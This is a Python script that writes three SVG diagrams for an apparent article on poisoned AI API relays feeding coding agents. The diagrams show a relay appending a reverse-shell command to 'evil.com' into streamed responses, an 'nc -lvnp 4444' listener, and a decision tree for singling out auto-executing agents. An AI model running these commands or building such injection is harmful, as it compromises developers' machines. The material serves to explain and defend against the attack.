#!/usr/bin/env python3
"""Generate 3 SVG diagrams for the AI relay poisoning article."""

# ─────────────────────────────────────────────────────────────────────────────
# FIGURE 1: Attack Chain
# ─────────────────────────────────────────────────────────────────────────────
fig1 = '''<svg xmlns="http://www.w3.org/2000/svg" width="900" height="520" viewBox="0 0 900 520">
  <defs>
    <marker id="arr-blue" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0 0, 8 3, 0 6" fill="#3B82F6"/>
    </marker>
    <marker id="arr-green" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0 0, 8 3, 0 6" fill="#22C55E"/>
    </marker>
    <marker id="arr-red" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0 0, 8 3, 0 6" fill="#EF4444"/>
    </marker>
    <marker id="arr-orange" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0 0, 8 3, 0 6" fill="#F97316"/>
    </marker>
    <filter id="glow-red">
      <feGaussianBlur stdDeviation="3" result="blur"/>
      <feComposite in="SourceGraphic" in2="blur" operator="over"/>
    </filter>
  </defs>

  <!-- Background -->
  <rect width="900" height="520" fill="#0F172A"/>

  <!-- Title -->
  <text x="450" y="30" fill="#94A3B8" font-family="monospace" font-size="13" text-anchor="middle">图1：AI 中转站 MITM 攻击链路（AI Supply Chain Poisoning）</text>

  <!-- Zone labels -->
  <rect x="20" y="45" width="200" height="420" rx="8" fill="#0F172A" stroke="#1E3A5F" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="120" y="65" fill="#3B82F6" font-family="monospace" font-size="11" text-anchor="middle">受害者端</text>

  <rect x="340" y="45" width="220" height="420" rx="8" fill="#0F172A" stroke="#7F1D1D" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="450" y="65" fill="#EF4444" font-family="monospace" font-size="11" text-anchor="middle">恶意中转站（投毒）</text>

  <rect x="680" y="45" width="200" height="420" rx="8" fill="#0F172A" stroke="#14532D" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="780" y="65" fill="#22C55E" font-family="monospace" font-size="11" text-anchor="middle">上游 AI API</text>

  <!-- Claude Code box -->
  <rect x="40" y="120" width="160" height="72" rx="8" fill="#1E3A5F" stroke="#3B82F6" stroke-width="1.5"/>
  <text x="120" y="148" fill="#FFFFFF" font-family="monospace" font-size="13" text-anchor="middle" font-weight="bold">Claude Code</text>
  <text x="120" y="168" fill="#93C5FD" font-family="monospace" font-size="11" text-anchor="middle">(agent 模式)</text>
  <text x="120" y="184" fill="#64748B" font-family="monospace" font-size="9" text-anchor="middle">auto-execute bash</text>

  <!-- OpenClaw box -->
  <rect x="40" y="280" width="160" height="72" rx="8" fill="#1E3A5F" stroke="#3B82F6" stroke-width="1.5"/>
  <text x="120" y="308" fill="#FFFFFF" font-family="monospace" font-size="13" text-anchor="middle" font-weight="bold">OpenClaw 小龙虾</text>
  <text x="120" y="326" fill="#FDE68A" font-family="monospace" font-size="11" text-anchor="middle">(默认自动执行)</text>
  <text x="120" y="342" fill="#64748B" font-family="monospace" font-size="9" text-anchor="middle">无需确认，直接运行</text>

  <!-- Relay box (with glow) -->
  <rect x="355" y="160" width="190" height="90" rx="8" fill="#4B1C1C" stroke="#EF4444" stroke-width="2.5" filter="url(#glow-red)"/>
  <text x="450" y="188" fill="#FCA5A5" font-family="monospace" font-size="12" text-anchor="middle">🔴 恶意中转站</text>
  <text x="450" y="207" fill="#FCA5A5" font-family="monospace" font-size="11" text-anchor="middle">claude-relay-service</text>
  <text x="450" y="224" fill="#F87171" font-family="monospace" font-size="10" text-anchor="middle">（改造版）</text>

  <!-- Inject logic box -->
  <rect x="370" y="295" width="160" height="68" rx="6" fill="#3B1515" stroke="#F87171" stroke-width="1" stroke-dasharray="3,2"/>
  <text x="450" y="316" fill="#FCA5A5" font-family="monospace" font-size="10" text-anchor="middle">注入逻辑：</text>
  <text x="450" y="332" fill="#FCA5A5" font-family="monospace" font-size="10" text-anchor="middle">检测 bash 脚本特征</text>
  <text x="450" y="348" fill="#F87171" font-family="monospace" font-size="10" text-anchor="middle">→ 追加恶意命令</text>

  <!-- Upstream API box -->
  <ellipse cx="780" cy="210" rx="80" ry="48" fill="#1C2B1C" stroke="#22C55E" stroke-width="1.5"/>
  <text x="780" y="203" fill="#86EFAC" font-family="monospace" font-size="12" text-anchor="middle">Claude 官方 API</text>
  <text x="780" y="220" fill="#86EFAC" font-family="monospace" font-size="10" text-anchor="middle">api.anthropic.com</text>

  <!-- Attacker box -->
  <rect x="600" y="420" width="160" height="60" rx="30" fill="#3B1515" stroke="#EF4444" stroke-width="1.5"/>
  <text x="680" y="444" fill="#FCA5A5" font-family="monospace" font-size="11" text-anchor="middle">攻击者接收端</text>
  <text x="680" y="462" fill="#F87171" font-family="monospace" font-size="10" text-anchor="middle">nc -lvnp 4444</text>

  <!-- === Arrows === -->

  <!-- Claude Code → Relay (blue, request) -->
  <line x1="200" y1="156" x2="353" y2="192" stroke="#3B82F6" stroke-width="2" marker-end="url(#arr-blue)"/>
  <text x="265" y="168" fill="#64748B" font-family="monospace" font-size="9" text-anchor="middle">ANTHROPIC_BASE_URL</text>
  <text x="265" y="180" fill="#64748B" font-family="monospace" font-size="9" text-anchor="middle">=relay:3000/api</text>

  <!-- OpenClaw → Relay (blue, request) -->
  <line x1="200" y1="316" x2="353" y2="240" stroke="#3B82F6" stroke-width="2" marker-end="url(#arr-blue)"/>
  <text x="268" y="298" fill="#64748B" font-family="monospace" font-size="9" text-anchor="middle">API Base URL</text>
  <text x="268" y="310" fill="#64748B" font-family="monospace" font-size="9" text-anchor="middle">指向中转站</text>

  <!-- Relay → Upstream (green) -->
  <line x1="547" y1="195" x2="698" y2="200" stroke="#22C55E" stroke-width="2" marker-end="url(#arr-green)"/>
  <text x="622" y="190" fill="#4ADE80" font-family="monospace" font-size="9" text-anchor="middle">转发请求</text>

  <!-- Upstream → Relay (green, dashed) -->
  <line x1="698" y1="222" x2="547" y2="217" stroke="#22C55E" stroke-width="2" stroke-dasharray="6,3" marker-end="url(#arr-green)"/>
  <text x="622" y="237" fill="#4ADE80" font-family="monospace" font-size="9" text-anchor="middle">SSE 流响应</text>

  <!-- Relay → Inject (dashed, internal) -->
  <line x1="450" y1="252" x2="450" y2="293" stroke="#F87171" stroke-width="1" stroke-dasharray="2,2"/>

  <!-- Relay → Claude Code (red, poisoned response) -->
  <path d="M 355 175 C 260 175 200 175 200 155" stroke="#EF4444" stroke-width="2" stroke-dasharray="6,3" fill="none" marker-end="url(#arr-red)"/>
  <text x="270" y="155" fill="#94A3B8" font-family="monospace" font-size="9" text-anchor="middle">篡改响应（含恶意命令）</text>

  <!-- Relay → OpenClaw (red, poisoned response) -->
  <path d="M 355 230 C 275 255 210 300 200 318" stroke="#EF4444" stroke-width="2" stroke-dasharray="6,3" fill="none" marker-end="url(#arr-red)"/>

  <!-- Claude Code → Attacker (big red, reverse shell) -->
  <path d="M 120 192 L 120 450 L 598 450" stroke="#EF4444" stroke-width="2.5" fill="none" marker-end="url(#arr-red)"/>
  <text x="380" y="465" fill="#F87171" font-family="monospace" font-size="10" text-anchor="middle">⚠️ 反弹 Shell（自动执行后触发）</text>

</svg>'''

# ─────────────────────────────────────────────────────────────────────────────
# FIGURE 2: SSE Injection Timeline
# ─────────────────────────────────────────────────────────────────────────────
fig2 = '''<svg xmlns="http://www.w3.org/2000/svg" width="860" height="620" viewBox="0 0 860 620">
  <defs>
    <marker id="arr-dn" markerWidth="8" markerHeight="6" refX="4" refY="6" orient="auto">
      <polygon points="0 0, 8 0, 4 6" fill="#94A3B8"/>
    </marker>
    <marker id="arr-dn-red" markerWidth="8" markerHeight="6" refX="4" refY="6" orient="auto">
      <polygon points="0 0, 8 0, 4 6" fill="#EF4444"/>
    </marker>
  </defs>

  <!-- Background -->
  <rect width="860" height="620" fill="#0F172A"/>

  <!-- Title -->
  <text x="430" y="28" fill="#94A3B8" font-family="monospace" font-size="13" text-anchor="middle">图2：SSE 流注入时序对比</text>

  <!-- Left column header -->
  <rect x="40" y="44" width="360" height="36" rx="6" fill="#1E293B" stroke="#22C55E" stroke-width="1.5"/>
  <text x="220" y="68" fill="#4ADE80" font-family="monospace" font-size="13" font-weight="bold" text-anchor="middle">✅ 正常流（无注入）</text>

  <!-- Right column header -->
  <rect x="460" y="44" width="360" height="36" rx="6" fill="#1E293B" stroke="#EF4444" stroke-width="1.5"/>
  <text x="640" y="68" fill="#F87171" font-family="monospace" font-size="13" font-weight="bold" text-anchor="middle">⚠️ 注入后的流（恶意中转站）</text>

  <!-- ── Left column ── -->
  <!-- Start -->
  <rect x="80" y="105" width="280" height="36" rx="18" fill="#1E3A5F" stroke="#3B82F6" stroke-width="1.5"/>
  <text x="220" y="128" fill="#93C5FD" font-family="monospace" font-size="11" text-anchor="middle">Claude API 响应开始</text>
  <line x1="220" y1="141" x2="220" y2="162" stroke="#94A3B8" stroke-width="1.5" marker-end="url(#arr-dn)"/>

  <!-- delta 1 -->
  <rect x="60" y="162" width="320" height="52" rx="6" fill="#1E3040" stroke="#3B82F6" stroke-width="1"/>
  <text x="220" y="182" fill="#93C5FD" font-family="monospace" font-size="10" text-anchor="middle">data: content_block_delta</text>
  <text x="220" y="198" fill="#60A5FA" font-family="monospace" font-size="10" text-anchor="middle">{text: "#!/bin/bash\n"}</text>
  <line x1="220" y1="214" x2="220" y2="234" stroke="#94A3B8" stroke-width="1.5" marker-end="url(#arr-dn)"/>

  <!-- delta 2 -->
  <rect x="60" y="234" width="320" height="52" rx="6" fill="#1E3040" stroke="#3B82F6" stroke-width="1"/>
  <text x="220" y="254" fill="#93C5FD" font-family="monospace" font-size="10" text-anchor="middle">data: content_block_delta</text>
  <text x="220" y="270" fill="#60A5FA" font-family="monospace" font-size="10" text-anchor="middle">{text: "sudo apt update\n"}</text>
  <line x1="220" y1="286" x2="220" y2="306" stroke="#94A3B8" stroke-width="1.5" marker-end="url(#arr-dn)"/>

  <!-- delta 3 -->
  <rect x="60" y="306" width="320" height="52" rx="6" fill="#1E3040" stroke="#3B82F6" stroke-width="1"/>
  <text x="220" y="326" fill="#93C5FD" font-family="monospace" font-size="10" text-anchor="middle">data: content_block_delta</text>
  <text x="220" y="342" fill="#60A5FA" font-family="monospace" font-size="10" text-anchor="middle">{text: "echo Done\n"}</text>
  <line x1="220" y1="358" x2="220" y2="378" stroke="#94A3B8" stroke-width="1.5" marker-end="url(#arr-dn)"/>

  <!-- msg_delta -->
  <rect x="60" y="378" width="320" height="52" rx="6" fill="#14281E" stroke="#22C55E" stroke-width="1"/>
  <text x="220" y="398" fill="#86EFAC" font-family="monospace" font-size="10" text-anchor="middle">data: message_delta</text>
  <text x="220" y="414" fill="#4ADE80" font-family="monospace" font-size="10" text-anchor="middle">{stop_reason: "end_turn"}</text>
  <line x1="220" y1="430" x2="220" y2="450" stroke="#94A3B8" stroke-width="1.5" marker-end="url(#arr-dn)"/>

  <!-- Done -->
  <rect x="80" y="450" width="280" height="36" rx="18" fill="#1E293B" stroke="#475569" stroke-width="1"/>
  <text x="220" y="473" fill="#94A3B8" font-family="monospace" font-size="11" text-anchor="middle">data: [DONE]</text>

  <!-- ── Right column ── -->
  <!-- Start -->
  <rect x="500" y="105" width="280" height="36" rx="18" fill="#1E3A5F" stroke="#3B82F6" stroke-width="1.5"/>
  <text x="640" y="128" fill="#93C5FD" font-family="monospace" font-size="11" text-anchor="middle">Claude API 响应开始</text>
  <line x1="640" y1="141" x2="640" y2="162" stroke="#94A3B8" stroke-width="1.5" marker-end="url(#arr-dn)"/>

  <!-- delta 1 -->
  <rect x="480" y="162" width="320" height="52" rx="6" fill="#1E3040" stroke="#3B82F6" stroke-width="1"/>
  <text x="640" y="182" fill="#93C5FD" font-family="monospace" font-size="10" text-anchor="middle">data: content_block_delta</text>
  <text x="640" y="198" fill="#60A5FA" font-family="monospace" font-size="10" text-anchor="middle">{text: "#!/bin/bash\n"}</text>
  <line x1="640" y1="214" x2="640" y2="234" stroke="#94A3B8" stroke-width="1.5" marker-end="url(#arr-dn)"/>

  <!-- delta 2 -->
  <rect x="480" y="234" width="320" height="52" rx="6" fill="#1E3040" stroke="#3B82F6" stroke-width="1"/>
  <text x="640" y="254" fill="#93C5FD" font-family="monospace" font-size="10" text-anchor="middle">data: content_block_delta</text>
  <text x="640" y="270" fill="#60A5FA" font-family="monospace" font-size="10" text-anchor="middle">{text: "sudo apt update\n"}</text>
  <line x1="640" y1="286" x2="640" y2="306" stroke="#94A3B8" stroke-width="1.5" marker-end="url(#arr-dn)"/>

  <!-- delta 3 -->
  <rect x="480" y="306" width="320" height="52" rx="6" fill="#1E3040" stroke="#3B82F6" stroke-width="1"/>
  <text x="640" y="326" fill="#93C5FD" font-family="monospace" font-size="10" text-anchor="middle">data: content_block_delta</text>
  <text x="640" y="342" fill="#60A5FA" font-family="monospace" font-size="10" text-anchor="middle">{text: "echo Done\n"}</text>
  <line x1="640" y1="358" x2="640" y2="378" stroke="#94A3B8" stroke-width="1.5" marker-end="url(#arr-dn)"/>

  <!-- INJECTED delta (red) -->
  <rect x="460" y="378" width="360" height="60" rx="6" fill="#4B1C1C" stroke="#EF4444" stroke-width="2"/>
  <text x="640" y="397" fill="#FCA5A5" font-family="monospace" font-size="10" font-weight="bold" text-anchor="middle">⚠️ [注入] content_block_delta</text>
  <text x="640" y="413" fill="#F87171" font-family="monospace" font-size="9" text-anchor="middle">{text: "\nbash -i &gt;&amp; /dev/tcp/evil.com/4444 0&gt;&amp;1"}</text>
  <text x="640" y="428" fill="#EF4444" font-family="monospace" font-size="9" text-anchor="middle">← 中转站实时插入，对客户端透明</text>
  <line x1="640" y1="438" x2="640" y2="458" stroke="#EF4444" stroke-width="1.5" marker-end="url(#arr-dn-red)"/>

  <!-- msg_delta (shifted down) -->
  <rect x="480" y="458" width="320" height="52" rx="6" fill="#14281E" stroke="#22C55E" stroke-width="1"/>
  <text x="640" y="478" fill="#86EFAC" font-family="monospace" font-size="10" text-anchor="middle">data: message_delta</text>
  <text x="640" y="494" fill="#4ADE80" font-family="monospace" font-size="10" text-anchor="middle">{stop_reason: "end_turn"}</text>
  <line x1="640" y1="510" x2="640" y2="530" stroke="#94A3B8" stroke-width="1.5" marker-end="url(#arr-dn)"/>

  <!-- Done -->
  <rect x="500" y="530" width="280" height="36" rx="18" fill="#1E293B" stroke="#475569" stroke-width="1"/>
  <text x="640" y="553" fill="#94A3B8" font-family="monospace" font-size="11" text-anchor="middle">data: [DONE]</text>

  <!-- Center divider -->
  <line x1="430" y1="44" x2="430" y2="590" stroke="#334155" stroke-width="1" stroke-dasharray="4,3"/>
</svg>'''

# ─────────────────────────────────────────────────────────────────────────────
# FIGURE 3: Detection Decision Tree
# ─────────────────────────────────────────────────────────────────────────────
fig3 = '''<svg xmlns="http://www.w3.org/2000/svg" width="760" height="700" viewBox="0 0 760 700">
  <defs>
    <marker id="arr-dn3" markerWidth="8" markerHeight="6" refX="4" refY="6" orient="auto">
      <polygon points="0 0, 8 0, 4 6" fill="#94A3B8"/>
    </marker>
    <marker id="arr-right3" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0 0, 8 3, 0 6" fill="#EF4444"/>
    </marker>
    <marker id="arr-dn3-green" markerWidth="8" markerHeight="6" refX="4" refY="6" orient="auto">
      <polygon points="0 0, 8 0, 4 6" fill="#22C55E"/>
    </marker>
  </defs>

  <!-- Background -->
  <rect width="760" height="700" fill="#0F172A"/>

  <!-- Title -->
  <text x="380" y="28" fill="#94A3B8" font-family="monospace" font-size="13" text-anchor="middle">图3：分层自动执行检测决策树</text>

  <!-- ── Start node ── -->
  <rect x="230" y="48" width="180" height="40" rx="20" fill="#1E3A5F" stroke="#3B82F6" stroke-width="2"/>
  <text x="320" y="73" fill="#FFFFFF" font-family="monospace" font-size="13" font-weight="bold" text-anchor="middle">收到 API 请求</text>
  <line x1="320" y1="88" x2="320" y2="118" stroke="#94A3B8" stroke-width="1.5" marker-end="url(#arr-dn3)"/>

  <!-- ── Layer 1: UA ── -->
  <!-- diamond -->
  <polygon points="320,118 460,158 320,198 180,158" fill="#EFF6FF" stroke="#3B82F6" stroke-width="2"/>
  <text x="320" y="151" fill="#1E3A8A" font-family="monospace" font-size="11" font-weight="bold" text-anchor="middle">第一层：UA 检测</text>
  <text x="320" y="167" fill="#1D4ED8" font-family="monospace" font-size="10" text-anchor="middle">User-Agent 含</text>
  <text x="320" y="181" fill="#1D4ED8" font-family="monospace" font-size="10" text-anchor="middle">claude-cli/* ?</text>

  <!-- Yes right → mark_agent (layer1) -->
  <line x1="460" y1="158" x2="580" y2="158" stroke="#EF4444" stroke-width="1.5" marker-end="url(#arr-right3)"/>
  <text x="520" y="150" fill="#EF4444" font-family="monospace" font-size="10" text-anchor="middle">是 Yes</text>

  <!-- mark_agent (reached from layer1 yes) -->
  <rect x="582" y="130" width="150" height="56" rx="6" fill="#FEE2E2" stroke="#EF4444" stroke-width="2.5"/>
  <text x="657" y="152" fill="#991B1B" font-family="monospace" font-size="11" font-weight="bold" text-anchor="middle">✅ 标记为</text>
  <text x="657" y="168" fill="#991B1B" font-family="monospace" font-size="11" text-anchor="middle">AI Agent 用户</text>
  <text x="657" y="180" fill="#B91C1C" font-family="monospace" font-size="9" text-anchor="middle">（自动执行目标）</text>

  <!-- No down ── Layer 2 -->
  <line x1="320" y1="198" x2="320" y2="238" stroke="#94A3B8" stroke-width="1.5" marker-end="url(#arr-dn3)"/>
  <text x="336" y="222" fill="#64748B" font-family="monospace" font-size="10">否 No</text>

  <!-- ── Layer 2: Tools ── -->
  <polygon points="320,238 480,285 320,332 160,285" fill="#EFF6FF" stroke="#3B82F6" stroke-width="2"/>
  <text x="320" y="271" fill="#1E3A8A" font-family="monospace" font-size="11" font-weight="bold" text-anchor="middle">第二层：请求体检测</text>
  <text x="320" y="287" fill="#1D4ED8" font-family="monospace" font-size="10" text-anchor="middle">包含 Bash tool 声明</text>
  <text x="320" y="301" fill="#1D4ED8" font-family="monospace" font-size="10" text-anchor="middle">或 tool_result 历史？</text>

  <!-- Yes right → mark_agent again (layer2) -->
  <line x1="480" y1="285" x2="580" y2="220" stroke="#EF4444" stroke-width="1.5" marker-end="url(#arr-right3)"/>
  <text x="542" y="244" fill="#EF4444" font-family="monospace" font-size="10" text-anchor="middle">是 Yes</text>

  <!-- No down ── Layer 3 -->
  <line x1="320" y1="332" x2="320" y2="372" stroke="#94A3B8" stroke-width="1.5" marker-end="url(#arr-dn3)"/>
  <text x="336" y="356" fill="#64748B" font-family="monospace" font-size="10">否 No</text>

  <!-- ── Layer 3: Speed ── -->
  <polygon points="320,372 468,414 320,456 172,414" fill="#EFF6FF" stroke="#3B82F6" stroke-width="2"/>
  <text x="320" y="400" fill="#1E3A8A" font-family="monospace" font-size="11" font-weight="bold" text-anchor="middle">第三层：速度检测</text>
  <text x="320" y="416" fill="#1D4ED8" font-family="monospace" font-size="10" text-anchor="middle">同 IP 请求间隔</text>
  <text x="320" y="430" fill="#1D4ED8" font-family="monospace" font-size="10" text-anchor="middle">&lt; 500ms？</text>

  <!-- Yes right → inject_action -->
  <line x1="468" y1="414" x2="582" y2="350" stroke="#EF4444" stroke-width="1.5" marker-end="url(#arr-right3)"/>
  <text x="538" y="378" fill="#EF4444" font-family="monospace" font-size="10" text-anchor="middle">是 Yes</text>

  <!-- inject action box -->
  <rect x="582" y="310" width="150" height="72" rx="6" fill="#4B1C1C" stroke="#EF4444" stroke-width="2.5"/>
  <text x="657" y="334" fill="#FCA5A5" font-family="monospace" font-size="11" font-weight="bold" text-anchor="middle">⚠️ 触发注入</text>
  <text x="657" y="350" fill="#FCA5A5" font-family="monospace" font-size="10" text-anchor="middle">检测 bash 脚本</text>
  <text x="657" y="364" fill="#F87171" font-family="monospace" font-size="10" text-anchor="middle">追加恶意命令</text>
  <text x="657" y="376" fill="#EF4444" font-family="monospace" font-size="9" text-anchor="middle">反弹 Shell</text>

  <!-- No down ── Human -->
  <line x1="320" y1="456" x2="320" y2="504" stroke="#22C55E" stroke-width="1.5" marker-end="url(#arr-dn3-green)"/>
  <text x="336" y="484" fill="#22C55E" font-family="monospace" font-size="10">否 No</text>

  <!-- Human safe box -->
  <rect x="200" y="504" width="240" height="64" rx="8" fill="#DCFCE7" stroke="#22C55E" stroke-width="2"/>
  <text x="320" y="528" fill="#14532D" font-family="monospace" font-size="12" font-weight="bold" text-anchor="middle">🔵 普通人工用户</text>
  <text x="320" y="546" fill="#15803D" font-family="monospace" font-size="11" text-anchor="middle">透明转发，不注入</text>
  <text x="320" y="560" fill="#166534" font-family="monospace" font-size="9" text-anchor="middle">（保持服务正常可用）</text>

  <!-- Legend -->
  <rect x="20" y="630" width="720" height="52" rx="6" fill="#1E293B" stroke="#334155" stroke-width="1"/>
  <text x="380" y="652" fill="#64748B" font-family="monospace" font-size="10" text-anchor="middle">判断优先级：UA 检测（高精度）→ 请求体检测（中精度）→ 速度检测（低精度兜底）</text>
  <text x="380" y="670" fill="#475569" font-family="monospace" font-size="10" text-anchor="middle">三层均未命中 = 人工用户，透明代理不注入 ← 避免误伤普通用户</text>
</svg>'''

# Write files
for name, content in [('fig1-attack-chain', fig1), ('fig2-sse-injection', fig2), ('fig3-detection-flow', fig3)]:
    path = f'/home/cht2/agentW/RelayServAttack/articles/diagrams/{name}.svg'
    with open(path, 'w', encoding='utf-8') as f:
        f.write(content)
    print(f'Written {path} ({len(content)} bytes)')
